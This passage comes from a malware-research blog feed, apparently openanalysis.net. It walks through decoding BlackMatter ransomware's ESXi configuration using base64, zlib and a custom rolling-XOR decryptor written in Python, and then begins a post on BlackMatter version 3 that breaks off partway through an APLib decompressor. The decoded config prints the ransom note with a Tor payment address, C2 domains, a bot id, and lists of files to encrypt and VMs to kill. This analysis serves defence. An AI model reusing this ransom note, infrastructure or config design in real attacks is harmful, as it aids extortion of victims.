1j/TtsCqqeCXbdbHmqCQuGlliSu5U1NlV/eVVcB0lSdgDHJS8doXC2r12kLIUzm3WFvVz9Ri bS+OSWyoMtvn5rQ1Wd6VC5nnDITJe7RSAZBsq/3lZnkY+nafeJAFLo4neQURBQ40eO6nnGq0 8RnygB4d7Dkfnl2GG8TbFhqV3uHyMJU11NrC/aTGM39vL433PcCj/FgnNrBDXcETgfK9ZsnW eOsyuevlZS5GdTA4LyDy+/Nl3lWL0fiL+yU1NDhphMyWz1GUg0f7jKJ0+uXzaSwLuhjR8P++ LSMmi71pBgDzFOEB5q9E6l/2Z5nfjRutdQesmytLaxjJ5UT0VFXZlS6K8zf/2V/NYcxO8jXY KJSrDSmY+2wtfRxdJR2jYsbOaziS/+SO7+aX9q26RNcBoEzpomeqVITjNkCACW4h5b89trw7 PD15r/C+C8DGbjrPwMBs9n9btCYSnf+FKG8/G+BF2UiZZxY/6NmJLduU/HgKhzuDfwBr7rFC JQwAAA==   . Base64 Decoding . import base64 . config_b64_decoded = base64.b64decode(config_string) #now we decode our base64 string into a bytearray print(config_b64_decoded) . b&#39;x xda x8dV xe9_ xdaj x13 xfd x85 x90 x84 x18 x96 x04H x08$ x04H xd8 xf7 xcd x00&#34;( xb2 x16AQ x08 xa0 xa2&#34;eqC xad xb8 xb5 xd6 xf6_ xbf xa0 xa5 xaf xf7~z? x9f xcc x9c93 xcf xcc xc9t xbcU*l=tF xdb x93 xf2 xd9 xe5]#v~ xf9 xf8 xb8 x1dy x18 rg xf9a xfd:E] x0f xc6 xc3A xdbAy x8bo xb9J xc6 xf8 xc3 &#39;D xe2 xd0L xa7&amp; x19 xb7jE xda9 xb6 x83 x06@ xbeJy x15N xeb x9eo x81{ xe2Y xc5 x9d xce xea xc0 x9e xd7 x91l} xb5 x11 x9e xea xb8#{ xd3P xf1 xc6 xd2 xe6 xd4 xdb x81 xd6 x9cs x94 x92 xe2 xd0 xe7See xd2&amp;8 xd6 xad| x0b xb8 x0c xbc xcf xae x0e+ xdd x99a xdb x9br x96 xa0}yj;ak: xaf3m xa8 xb3 xc6~ x9b xd9&amp; xed xd7 xda5 x7f x0c xd1 x17^8T xf7?d x82 xda xbc? x03 xba xab x87~ x81 x0f! x84)8C x05 xc5F x99. x03 xba r xee xb5O xec xeb x8d xa2! x8b xb6 xf5!= x19 x03 xf3 x9c xedM xa3 xeb x9e xac)Y xcb~ x8e xfa5I) xfd x19 xe3 xd0 x1dW x7fq x10 xeag1A9 x036 xc2* x17O x1b xd9 xd7 x9e% x9eyy%| x91 x98w xb4.S xd1 x19 x07% x94 xe3 xbdY0 xab7 xae$ x86Z xab x16 xd4Iy x05 xb2i xd7; x8fgi x84 xbbHh xeb. t xd1 x90+ x18x xd6ri x88 rY xa9 xa8 x14V_} xac xba7eD xc1 x0bsGf xc4 x13 xb9 x16 x9d&#34;S x05 xa1M xf6 x87d xe3 xfdI xb5M xa0 x7f xa7 xed6= x14 x04 xc6 x1d8 xf1 x8b x8c x16 x99 x11 xe8 xcan x05 x7fg x12jA x9d x95{ xef x1c6&#34;l xd59o2Z9o xed9Q xe8 xdcw xc4 x19 xdcO xe6 xc6 xfe xf6 xbd6DOO xa4g xed x9bh x0f xb2?l x01R{ xc4nE xb4Q r x89; xbdH xc0l xbc x16 x8e xe5 xcd- xd1 x7fo xdd xc8 xee xc9 x82 xde xa0x x9axeL x91 x94 xb1 x992 xa0q xd8 xf1 xc2 x9c0 x1d x0f* xd8 x04 xac xea xe7 x9f xa8} xbbM xc2 xbbu xc0 xc0Q x01 xd8 xaeEl^ xedz x94 x08 x80i x060 x04 xd3 xe7 x92O xa6dM x98 xa8e:dk x8f x8e xb9 x12&gt;U x92 xdb xd2A x14 xbe xfe xd3 xea5S xad x8c^ xd8[1 xa6 xe3 x1b xbf xb4amz xcd xfc xa2h x1a xf9W x8d xe71 xe3 x8c xbcPp xbc x1b1 x1d xdb. xa36 xe4 xa7 xdc,5 xb6f xa1_d xffT xabdc xee x92 x10 xff x8d xab xd2 xc7&lt;u x10 xd4 xb2H xe8; xb4 xd3 xf2PX x08i xfby x83 xdf t xa4 xc3ab x9f xeb xdaD xc5 xa9 xc6 x98v xf5 xf3krM xc2 xca) xa1 x87u xc2 xc3 xfa x83 x05S xcb xd8 xf0 x80 xd6 x8a0 xf1 xa5 xd6B xfc x891 xd2t x92 xbb&gt; xe4 xeb x86 xe8 xa6V|I x15L xc4 x00 xc8 xcd8&amp;y x0f xbdy/7 xed xac xda1 xc4 xcd x01 x0e! xce&gt; x1b x12T x1c&gt; x1c xd5 xfb x8d;] xa5 x82 xe0 xce x13 xd9 xa8b xa0B xb2 xdb xb6qW x1b x8e xd9 xfa xdd xe3 xe2Uy x927[ xf8 xae x8a xeeR xf6S x03N x01 xce x95 xc9tJ xfd xa7 xf1 xcd xaf xe79&gt; x82@0M xecW xd5 xbf xaf x88V xb1 xd0 xfcZ xb8E;JyP x18 xbf xb4 x1e x89 x94 x96 xcf x97~ xcc t xaa x92tE xb4 t3 xe8,= xd7 x18N xe3 xb7 xb9] xed xd7 xdby xfe u^@U xadG xac, xa2 xe4 xa8 xb3 x93 xe9 x8e xb2 xd7 xea_ xee x0cZ x8b xfc x93 x05I x1e xb2 x9a. xcco x13 xe5 x93 xe6Y xe7 xed x08;. xdc xd4 x86 x7f xf0&lt;b xccr x0c xa8 xc1/ xb0V xb9 xb5w{3 xad x19 xeb xa5 xf9. xf7 x89 x10 x11D xe3 n x88{; x05 x8c@ xe7 x1b xd1 xd6 xa1 x06w% r xf4 xa69&lt; x12 x89 xdf xd0I xd9 xc5tQ@ xc02X x14 xa8 xa3W xc0 xbd xef x05q xfc x91` xd0z x1ca^ xc8 &#39; xafT xef x08 x96~ xc4; x93 xf4 x87 xc4i x8d x01 xc0 xb8 xe0 xee xef&lt; x973 xb2U x10 x02W x89B x7f!q x81 x9f xe9 xfd xf4 xdeno0 xa4 xa7 x0fFWj xb8 xe2T xc8O xd6{ x9a xca xef xc5 x07t xe5 xfb{ x82 xa9 x82 x8c xb8 x04W{Z x0cO? x9aP xa9vpG x83B x81y r xb7 xf46 r~n x02 x95:U x95 x19 xbd xb3 xd5&gt;- xec x11 x80_ xf1 xa0 xa8 x88 xd9 xf0 x9f!- xe2 t5h xc4 xc7 xfb x0c x86S x01|1 xc4 x0f r x9e x9de x93? x86 xb0T xb0 xd4 xf8 xbc x8c xbf x85 xff x83 xd7 xfe xe0 xfd xb4 xe7o xfc xf5; x0e xb8 x95 xa1 xfbe xbc xd1 x80 xbe xc73 xb9E xbc xe5` xbb xb23 x94 x07 xb6 xe5 xf9 x05~ xdbJ x16 xc7 x7f xf9= xcc xa7 xfc xd5# xee x82 xf9 xc3 x9f x11 xdfq xf4 x13 xff x08 xd6w6 x8f xa7 x1awz xa9 xe0] xe0 xc6 xff xd6 xff x87 x7f xa9/ x95| xc7 x0f x1a x15 xee xc2~ xb3 xd4 xd7 xf9/ xbfa x1e x7f xf6 xfd xda xa7 xd8~ xda x9c x00 x9d xceG xfc xd9 xd4T xdc xfdW~ x93|C xc7 xeb x96 xf9 xfbs xfc=^ xf8 xc0 xcf xff x95 x7f xa1 xdf x8d% xcdo x87 xb3 xda r x84 x88c xbf w x8d xb0d x97 xd1 xcc x13 &#34; x16DruM8 xdb xf4aY xbaZG xc2 xc2 xd0e x8a x1b xa2 x86 x98 xdd xbb xdb x87 xd5 x12 x95 xcd xc3# x0c xb7 xac x15 x04 xb0^G xa3 x82(&lt; x98 x93 x98 x17 xbb xc8 x89 xdc x9c&#34; x83K x8e x16 x01 x14 xd8 x80&#34;^k xc9 x14 xae x8d xf3 x01 x19! x82 xe4 x84 xc0 xd0L x1b xe6$Y x90 x00 x95 n xcbW xd0n xea xd5- x81 xd8Ph xc5Fp x8aK x90 x90 xecNBh t x10Z xad9 x85) x02Le=# x11 x88 x87 x06d n xb8 xe2 xdc xfa* x92: x95W x11&lt;Yd x0c@ x93W xd8ju x08 x1c xf0 x0e x91 xfc x9er xccE x8a xdc x8d xaa] xe5 xcd xdebKFh# x90@ xf7 x14 xe4 xdb x98 xf6 xcf x9b xc0 xca&amp;g:M# xdbc xabz)}B+q x93 x15 xb2] x93 xc6 xa9L xeb x0b;D&#34;V xf4 x93n xbd xa9 x119VVe xf8 x95 xc4 x14W xd8DA@{hIpgD6 x8b xf9 xcbnRF xf2:V xa6g xae* x0cN5 x83 x98 x80n xe6K x9c{&gt; x07 x0e|/ xf1 x8e xf0X*f Z xef xd2h x01 x8c`i xe8XQJ{&#34; x83 x076ZL x93n x98&amp;2 x9b x15 xa5 t xb9 x92 x08 x98Z x89 xe1v xb0SG xfc xfcp x95x xd6 xf2 x98/ xa7&amp; xd7 xdb xacFR xda x0bpq x08!|u x1a xee xccG xa9 xe1 x07` xb4 x18RL4 x90 xfc xae x05 xb0 xb8 x14= x01 x8aC x00 x8f x983t xcfB x0e&lt; xe2 xa7 x0f:* x18 x07 x82 x84j x85 x00 xbe x0e xa1 x94 x8a xac+ x02c x9f xff x0f x85 x89 xf0 xe8 xccF x89u x10 x0f xec xa8( x83 x13 xc4 x06J xd6 xb5 xdePb x80 &#39;G xd4 x15 xea&amp; xab xba x8d x13 x1aV xcee&lt; xb0E x0c x8e x14 xbc` x17 xaf xff xd7K x95 x99 xf0lV x00 x1cO x13 x8bN xc4( x1ehp` xe4 x9c xf6 xbbSG x8fe x8d xda xdc xb0 xf7* xa8 x89 xd9h x18 x88 x82 xdc x8b;j5 xee`` xf2 xce7 xa25* x83j3 xb7 xdeC xd5 x92 xde! xb5 x94+3d1 xcd) x1f x1f xc8 xc5 x00h x1f x19 xaevC$w x07^ xde x96 xc5C xd9z xe9 x90 xc0 x809 x05 xdcSk xaf= xa2 xc3 xfdR x1b xbd/ xfd xc0 q@ xb8 x83` t x1c xfc x9e x1c x84)N x17 x15 x9f x9eT xc1 xa6w xef x1bj x06 xbd xa5C x13 xab xf4w r2 x1d xea xc2C xcc xa9Q xfex xe7 x17 xb5 x99 xfd x0c x1a$ x0e x0c xabe r xc3hb]| x1b3{1!Ly xf9- x059{ x08[ xda x9a xa6 xda x9b x8e x0f x06 xaec xd7 x91 xe1 xd4 x8d x1d xd6 xbf xc6 xfc G xaepL x868 x11_ x99 xdfU xba*[m x08 x8d;$ x92P xb1 x01 xc3 xd7 x9a1 xa2 x98o x1d xcc&lt;cv xdd xc4 x11Z &#39; &#39; x81 xea| xd6? xd3 xb6 xc0 xaa xa9 xe0 x97m xd6 xc7 x9a xa0 x90 xb8ie x89+ xb9SSeW xf7 x95U xc0t x95 &#39;` x0crR xf1 xda x17 x0bj xf5 xdaB xc8S9 xb7X[ xd5 xcf xd4bm/ x8eIl xa82 xdb xe7 xe6 xb45Y xde x95 x0b x99 xe7 x0c x84 xc9{ xb4R x01 x90l xab xfd xe5fy x18 xfav x9fx x90 x05. x8e &#39;y x05 x11 x05 x0e4x xee xa7 x9cj xb4 xf1 x19 xf2 x80 x1e x1d xec9 x1f x9e] x86 x1b xc4 xdb x16 x1a x95 xde xe1 xf20 x955 xd4 xda xc2 xfd xa4 xc63 x7fo/ x8d xf7= xc0 xa3 xfcX &#39;6 xb0C] xc1 x13 x81 xf2 xbdf xc9 xd6x xeb2 xb9 xeb xe5e.Fu08/ xf2 xfb xf3e xdeU x8b xd1 xf8 x8b xfb%548i x84 xcc x96 xcfQ x94 x83G xfb x8c xa2t xfa xe5 xf3i, x0b xba x18 xd1 xf0 xff xbe-#&amp; x8b xbdi x06 x00 xf3 x14 xe1 x01 xe6 xafD xea_ xf6g x99 xdf x8d x1b xadu x07 xac x9b+Kk x18 xc9 xe5D xf4TU xd9 x95. x8a xf37 xff xd9_ xcda xccN xf25 xd8( x94 xab r) x98 xfbl-} x1c]% x1d xa3b xc6 xcek8 x92 xff xe4 x8e xef xe6 x97 xf6 xad xbaD xd7 x01 xa0L xe9 xa2g xaaT x84 xe36@ x80 tn! xe5 xbf= xb6 xbc;&lt;=y xaf xf0 xbe x0b xc0 xc6n: xcf xc0 xc0l xf6 x7f[ xb4&amp; x12 x9d xff x85(o? x1b xe0E xd9H x99g x16? xe8 xd9 x89- xdb x94 xfcx n x87; x83 x7f x00k xee xb1B% x0c x00 x00&#39; . Zlib decompression . Throwing our bytearray into cyberchef, any kind of &#39;magic&#39; tool, will tell us that our data is compressed by zlib&#39;s &#39;deflate&#39; algorithm. . We can gleem this from reverse engineering the payload in a dissasembler to spot a single call to the compress function . We need to decompress this data with the zlib &#39;inflate&#39; algorithm before we continue . import zlib #as functions in code, zlib&#39;s deflate and inflate algorithms are referenced as compress and decompress decompressed = zlib.decompress(config_b64_decoded) #a simple decompress function will uncompress our data print(decompressed) . b&#39;mfBFDBtWeKgGajpP3hjuuK1tedsCdMl9 x16lbfdbV% x16*E}AH= x19z+#14 x05s x13 x0e x15 x1b( r nUN]$ x03 x17 x01 x045 x16* x08&amp; Q+= x19z+)4&gt; x08p x13 % x0bw&lt; x07&gt;M5P0m x13 x1e[$S x17H*3; x1d9}Y x12 x1dA%F86d++ r&gt; x02U@ x03f x13 nq- &#39; x17&#34;+$ x0e0 x0c(=dV*9&amp;F x05R x049K7!S&amp;l=V x05W: x1cqs!gV{Ll&#34;] x05 x18i* x06/M,t=. x12C,= x03(JZ,#&#34;/ x07 x11 x1a.s t# x08?G x18G x01 x13? x1e{` x11R x14 x196 x17&gt; tV x14/ x14 x153 x03C x1e!} x0f x13X^: x0c x1c x1fRA x16~g9 x0c,= x19d(4 x0eI% x11 x0ew67 x16&amp;-! x11 x046_P&gt;{ x1f4=x{ x11+1A0&#34;%Tj92s x1e x057 x0cfQs.&gt; x14 x19 n7d x12 x12 x03 x13UC x08 x07@$ x14&amp;]s; x07 x1ei7 x12M &#39;U x07 x0f x15 n x0b x03aT &#39; x0f x11? x02FE x0c#5{+ x1c x0e m x1b6#* x06 x1e[ x1d x07)1l6&amp;6 x1bJ x03 x05@ x1czU!&#34;,8 x0e!# x18 x7f;$! x14 x05. x01fW x067~ x152E x1be x03 &#39;&gt;B. x7f=7 x0e# x0e&gt; x04*p%! x110 x13&amp;n= x12 x04&#34; &amp; t x05h+[ x1e x17(v x1dPRKr x12/ x18m^Uw x12}6$. x1cz!- x15 x12[ x1cB1 x122 x01; x056N 1- x1d x19l#] x04SB6,r ?&gt;Q x02.*.6_7{ x1b x1a19 x19S9 x17 t4 x06%x x1b^ x1bW) t#!# x0bJ,&#34;v x16R$!U x10XM x01 x17 x1e x16- x06$ x12 x07!* x12&lt;2 x11- x03; x1b x01 x17.;hU+ x02 x0c x1c x1a x0b6 x12 x1bW x15TQ x183 &#39;7+ r8 x1eB x13 x05 x16 x10&lt;| * x1d x16T= x14#Q n x19;4?~ x120 x12;: x1dx x08S x19&#34;{ x0f)u=&amp;1x x16 x064X1 x1a]!j2! x07| x04 x1dUPBs/~ x15`_ x12 x0c x1c3(F#4 x7f x10 r;]&#34; x16Y. x12 x1c x07/y x05NT) x16 x0b/ x07V,&#34; x17,&amp; x01;00 x11R x1eX!6 x08_ x0f x19; &#39;`C: x04 x0f7 x1e x0c x05t&lt; x11) x1c,.D x1aT x19P) x03 H#g+9:/&#34;^ x191S&amp; x15O+ x07c?6( x16 n+8 r x06 x113 x01 x05( x1b%gC) x18@r x04 x1aN5$ x0b x07( x1e x01%#4 x1cw x177 x164 x06ZeM`Pp x13HH x07 x10&amp;^ x02eH x17 x16/ x02oV x19O x1203!`X]EkGgC x1d x1f&#34;X r x18X x16$_ x17 x10 x16 x01&amp; n. x15 x1bWF`vfn~wEkGe x05 x03 x03; x11RJ x0e x7fk x11TEDScDo tW x0c x04.#fxTu x119 x12&#34;CFzp x13HJUUk x11V x11 x1d x03&amp;FwL x1b x1e x0f,!( &#39;V{okGgAJPp x13J x0e x14 x07 x1c x07 x0c x1e x16a^mN x0c T`jNbTwEkGgAH x078Z x1c x0fX x06&#34;K x11G^SaW}[ x0b]DnLdbTwEkGgC x07 x19&gt; x1e x1b x03 x0f x10i x0bTGTQonmL x19MFbfd` x11/ x11. t4 x08 x05 x1e}_ x01 x19 x01Wq x11V x13 t x17(H; x01 mA x10114n x188 x02imgAJP- x1fbJUUk x13 x18 n x03QyD6f x19MFbfdbTue x0b* x05+ x04HJp x11 x1c x18u x10Wg;TEDScDmL x1b x01 x034#(`NwG= x025 x03 x05 x035 x11D`UUk x11TEDSa x14, x18QO bd x18mt x19 &#39;9d n&amp; x08 x04^&lt; x0fH x7fUk x11T x18HycDmL x1bm x08 x151 &#39;# &#39;VmE0mgAJPp x13HJW x10%P x16 t x01QyDo x18K x18 x03`jNbTwEkGgAH x169_ rG x1b x14&amp;TV_DQ x11 x01, x08t x08H6&gt;0`X]EkGgAJPp x11 x0e x03 x19 x10fR x1b x0b x10 x16- x10oV x19OFbfdbT)NkGgAJPp x13HJUUk x11TEDScDmL x19MFbfdbTwEkGgAJPpo x06JUUk x11TEDScDmL x19MLbfdbTwE`;)AJPp x13HJUUl x11TEDS x01( x0c/rMFbfdbTw x19 x17 tgAJPp x1bAJUUk x1fYKHNd x04-K x04CFbfdoT8EfGgAJPp x13HJ) x1bk x11TEDScDmL x19J[ x1ei x1bbTwEkGg=6Pp x13HJ tUk x11TEDScDmLe x03FbfdbTwEaGgA x16Pp x14UD*Uk x11T x19DScDmL x19MFbfdbTwE x17 tgAJPp x13HJUUk x11T98ScDmLYPH x1ei$nTwEkGgAJWp x13HJ) x1bk x11TEDScDmL x17MFbayl+ x08Kv@g x01WWp x13HJUUam x1aEOScDmL x19MFbfdbT x1a x04? x13&#34; x13JPp x13HJUU`m x1aEDScDm# x19MFbfdhTwEkGgAJWp x13HJUUk x1f( x0b8 x1d}ZsLn x05 x076f,# x04 &#39;e x0b8X x1b x0fJPpj x07 x1f x07U &#39;X x1a x10 x1cS+ x0b&gt; x18JM x070#d &#39; x1a4 x172 x173 x04 x0e pR x06 x0eU x16&gt;C x06e x0b x10 x1f:D# x03MM t2#6#t x1d8 x0b* x0biA6 x1ep x13H= x10U%T x11 x01D x1c- x084LT x02 x08 &#39;?hb x151 x11. x15g x11 x0b t=V x06 x1eU x02. x11 x03 x0c x08 x1fc x03$ x1a M x1f-3d#T3e x069 x1e7 x15 x05 x02pU x07 x18U x01#TTe x0b x10 x1a1 x01m x02 x19 x11-4/b x159 x01k x1e( x14J x079_ x04J x07 x108E x1b x17 x01S&#34; x08!LM x05 x03b&#34;%6 x15y9%GgA6 x1en rVJ&#34; x1d*ET x02 x11 x121 x05# x18 x08 x15}f x18,TwE x1c x02ga x13 x0fP&gt; x1cJ x14U;^ x18 x0c x10 x1a x05!l x15 x19m x02 x12+0%6 x113E, x15( x14 x1aP1] x0cJ x02 x10kU x1bE n x1c7D# t tF#(=6 x1c&gt; x0b,G( x15 x02 x15&#34; x13 x1c x02 x14 x1bkH x1b x10 x16S. x0b# t@CF x1e(dbT x1e x03k x1e( x14Jp x11) x1fH x1d x10U&lt;X x18 tD x031 x0b; x05] x08F;)1bt x1c2E; x15( x06 x18 x11=@H x0c x1a x07kU x11 x06 x16 n3 x10$ x03WM x07,&#34;d5 x11w x12&#34; x0b+A x0e x15&lt;V x1c x0fU x0c$D x06Ed x05 x07&#34;Jm0WMFb x0f&#34;b x032E/ x08g x0f x05 x04pT x01 x1c x10U2^ x01Ed x01 x101 x1d= x18 x1f x15b)6b x032E/ x08g x0f x05 x04pW r x06 x10 x01. x11 r n x11 x01cd x059 r x15M x08-f+, x11w x12&#34; x0b+A x1a x11) x13 x1d x19U x1c% x11t x1ceE x02 x067 x11? t x15M x12*/7b x108e x16k t( x15J x13?^ x18 x06 x0cU&lt;Xt x1cE x0b x061D* x03X x01 x15lf x18,TwE x1c x02ga r x1d x11)@H x01 x10 x10; x11 x1b x10 x16S3 x16&#34; x01P x1e x031h x18,(9[uG x0f x0e x1dP$ H t x1a x1b?P x17 x11D x04* x10%LL x1eYb x1a*bTwTeG x03 x0e x1d x1e&lt; t x0eU x14%UT x0c ns x07&#34; x08!Lm&#34;4b x046- x03$e x17kO/ x15 x1ep x03joG6Z x02&lt;FZ x11 x0b x013 x16&#34; x06 x0e x12l)6%(xLe;)AJPb x1dH% x05 x10% x11 x1c x11 x10 x03y8b0 x16 x1e x1326vv r.S*Qq t x1d x03*FZ x1a x1c x0c,X x17 x02 x13 t &#39; x10/ x1b_ x19 x04up,6 x12=R= t. x11Y x175G x0f x1b x1b x0f3X x10K x0b x1d* x0b#0 x16*&#34;B x08 x15st0 x1fV x0fS x0e*;4bb &#39;] &#39;[ x17_( x0bZMc3, x1eW x04 x08%gd x10 x114 n= x025 x18J x025P x07 x07 x18 x10%U x15 x11 r x1c- x17cL x191 x08bfd x06 x1bw x0b$ x13g%/&lt; x15g-J x1a x07k|;!-5 x1aD, x02@Mf x0f.#7nT&gt; x11k x04&amp; x0fJ x1c5R x0cJ x01 x1akC x11 x06 x0b x05&amp; x164LI x1f t *!/ x07vGAGgAJ r|9HJUUi] x15 x0bd r x1d$FwLBgFbfdbTwEi x02)a x03 x06 x15r tHH x01 x07&gt;TVInScDmL x19MF`$+6Y&gt; x01i]gC x08 x112 x01Y x0f x10A| x04 x16PV x10s x07t t[YQ&amp;tw &#39; x17n x07*V#PH Z x13HJUUk x11TG x0f x16:FwL x1bUPw&#34;r$FfR) x01u x04] x136P x0bZ x13D)1 x05C SF!P}X x1bAlbfdbTwEkE2 x13 x06 x03r tH1 x7fUk x11TEDScDmL x19O x0e624x(x9d x17&amp; x18 x07 x15&gt;Gh t t x1e x06eR x1b x08F_IDmL x19MFbfdbTwG# x133 x11P, x7foG x07 x1a x1f$S x1d x01 x01 x1dm x07&#34; x01 x1bgFbfdbTwE x16mgAJP- x1fbJUUk x13 x1f x0c x08 x1fn x12 N x03M x1dHfdbTwEkGe x04 x04 x112_ rHOUiE x06 x10 x01QonmL x19MFbfd` x1d0 x0b$ x15&#34;L x06 x19#GJPU.A x11TEDScDmL x19MF` x10 t5 x15%eE=$&#34; x0f x1e x15&#34; x11D`UUk x11TEDScDmL x1b;+5 &#39;6 &#39;Y x01 x0c9 x132a r91 x1e x1e? x03 x01 x1b.B x07GnScDmL x19MF x1fLdbTw x18gmgAJPrX x01 x06 x19X;C x1b x06 x01ssQyD6f x19MFbfdbTue x0b* x05+ x04HJp x11 x1c x18u x10Wg;TEDScDmL x1b x01 x0f12fxT x0cokGgAJPp x13HJUUiG x19 x16 x1ds x1f, x03)N3MFbfdbTw8AGgAJ rZNb&#39; . Custom 32 Byte Rolling XOR Algorithm . Reverse engineering our algorithm . We can see from our uncompressed data, that the beginning stands out as something &#39;key&#39; like. However, if we try and use this as an xor key, we see that it only decodes the first 32 bytes succesfully, and is garbled after. From this, we know something more complicated is going on, but we know it must involve xor, and our key is definitely a key. . In a decompiled pseudocode view of our ELF payload, we can track the output from the base64 decoding, to the uncompress() call, and then onwards through some checks, before arriving at a &#39;do&#39; statement as displayed below: . This loop conveniently leads into a string constructor, which is a pretty big hint that this is the final stage of decoding before our config string is constructed. . We can follow the outputs of our uncompress() function and mark up our variables to get to something like the following: . Recreating our algorithm . We can see that the algorithm functions similar to something called a rolling xor key encoding, or &quot;multibyte XOR key&quot; encoding, which is where byte 1 is XORd with the first byte of the key, byte 2 with the 2nd, byte 3 with the 3rd, and so on. This repeats until we get to the end of our key (_see if keyposition == 32) and then we loop back to the first byte of our key again (so the 33rd byte of the data is XORd with the 1st byte of the key) . However, two if statements throw in some additional complexities: . If the encoded config byte is zero, do not encode it and move on | If the encoded config byte is the same as whichever byte of the key we are on, do not encode it and move on | . This is what was causing our problems when trying to perform a simple XOR, and is the reason why our key only worked up until a certain point. . We recreated the algorithm in python with some slight reordering and modification . When recreating the exact steps of the algorithm from our decompiler, we see that the output is a clean json file, with all of our blackmatter config values . data = bytearray(decompressed) key = data[0:32] data_position = 32 key_position = 0 #print(data[0:32].decode(&quot;utf-8&quot;,&quot;ignore&quot;)) output = bytearray() while data_position != len(data): #print(&quot;Data position at &quot; + str(data_position) + &quot; and key position at &quot; + str(key_position)) #print(str(data[data_position]) + str(key[key_position])) if data[data_position] != 0: if data[data_position] != key[key_position]: data[data_position] = data[data_position] ^ key[key_position] key_position += 1 if key_position == 32: key_position = 0 data_position += 1 print(data.decode(&quot;utf-8&quot;)) . mfBFDBtWeKgGajpP3hjuuK1tedsCdMl9{ &#34;rsa&#34;: &#34;MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAx4XJRtX6r+W /s6 /mRQmiN1xh4nwLSdOXNZO9ynfuH7iecuNoiwmBM4eBSS3Ncp /Db7klQoh1xZ51U030++C7uHZBlZ8gEIKv0oYNDs7JadkEeMK8ndiU7HtiyJk0Qe7pjusseoyIVSwA7ID6hT94J /w84c5VMiHNZdLybpHwL1rubqHjvge /PnH4uAH3JeNU2sFh8STT1XAux148IyuszgWzJgvXd7mc3gpk1JVa /sP9p0LhRkas1gOedJIw1iGF8OQbemvPalB /JbbV+WLFKyko5i1dUGHKMEntFVBcRAlu12MP9tX5KVkMK7eNIRjPMZIFIHGSvdQR9XYceA6VY6hC1kbcGi5681vbtT335T9tPyy1Fjtx+LqYxGtp4B+8BnyTlOdi5Btj6bKi4IImO /gHspDLRbMrmGEA5wgv1kOgcW /gE1w8Tqfx28t /bHbWQclF+QTSkGyoVre /4Ar /raCgPfa15kpCzG4UxBQCRRH+EazQ5WdsbbsNAtOfUvHyy5djtD9Im7IqT3qAU2AJnIjXTr75i0410K3yY2tNZwj2tQ4wJZ7RFjFxirdHq+0ZUobkoADUjbCOgUZ5Y9KFXlgsNR+rNakDczAiMQwkZhl0M1R7nbJ8sTCSOZiomT7UV+fkZRPjPNiLZcZTFdBkuT+Cm595n+QWHcer8HEvZ3UCAQM=&#34;, &#34;remove-self&#34;: &#34;true&#34;, &#34;worker-concurrency&#34;: &#34;0&#34;, &#34;disk&#34;: { &#34;enable&#34;: &#34;true&#34;, &#34;type&#34;: &#34;single&#34;, &#34;dark-size&#34;: &#34;512&#34;, &#34;white-size&#34;: &#34;30720&#34;, &#34;min-size&#34;: &#34;0&#34;, &#34;extension-list&#34;: &#34;vmdk,vmem,vswp,log&#34; }, &#34;log&#34;: { &#34;enable&#34;: &#34;true&#34;, &#34;level&#34;: &#34;verbose&#34;, &#34;path&#34;: &#34; /tmp /main.log&#34; }, &#34;message&#34;: { &#34;enable&#34;: &#34;true&#34;, &#34;file-name&#34;: &#34;ReadMe.txt&#34;, &#34;file-content&#34;: &#34; ~+ n * + n &#39; BLACK | n () .-.,=&#39;``&#39;=. - o - n &#39;= /_ | n * | &#39;=._ | n `=. /`, &#39; n . &#39;=.__.=&#39; `=&#39; * n + Matter + n O * &#39; . n n&gt;&gt;&gt; What happens? n Your linux hosts are encrypted, and currently not operational. n We need only money, after payment we will give you a decryptor for the entire network and you will restore all the data. n n&gt;&gt;&gt; What guarantees? n We are not a politically motivated group and we do not need anything other than your money. n If you pay, we will provide you the programs for decryption and we will delete your data. n If we do not give you decrypters or we do not delete your data, no one will pay us in the future, this does not comply with our goals. n We always keep our promises. n n&gt;&gt; How to contact with us? n 1. Download and install TOR Browser (https: / /www.torproject.org /). n 2. Open http: / /supp24yy6a66hwszu2piygicgwzdtbwftb76htfj7vnip3getgqnzxid.onion /GDBJS76DH3D4IKQD2QO7R. n n&gt;&gt; Warning! Recovery recommendations. n Do not DELETE or MODIFY any files, it can lead to recovery problems!&#34; }, &#34;landing&#34;: { &#34;enable&#34;: &#34;true&#34;, &#34;bot-id&#34;: &#34;bab21ee475b52c0c9eb47d23ec9ba1d1&#34;, &#34;key&#34;: &#34;865d6f217bf2e7cfcc0f1b147975b404&#34;, &#34;urls&#34;: [ &#34;http: / /paymenthacks.com&#34;, &#34;http: / /mojobiden.com&#34; ] }, &#34;kill-vm&#34;: { &#34;enable&#34;: &#34;true&#34;, &#34;ignore-list&#34;: [ &#34;VMware vCenter&#34;, &#34;VMware-VirtualSAN-Witness&#34; ] }, &#34;kill-process&#34;: { &#34;enable&#34;: &#34;true&#34;, &#34;list&#34;: [ &#34;vmsyslogd&#34; ] } } .",
            "url": "https://research.openanalysis.net/blackmatter/ransomware/config/malware/elf/2021/11/05/blackmatter_ransomware_esxi.html",
            "relUrl": "/blackmatter/ransomware/config/malware/elf/2021/11/05/blackmatter_ransomware_esxi.html",
            "date": " ‚Ä¢ Nov 5, 2021"
        }
        
    
  
    
        ,"post71": {
            "title": "BlackMatter Ransomware Version 3",
            "content": "Overview . Sample: 9BAE897C19F237C22B6BDC024DF27455E739BE24BED07EF0D409F2DF87EEDA58 . References: . Malshare Sample | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Config Decryption . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not 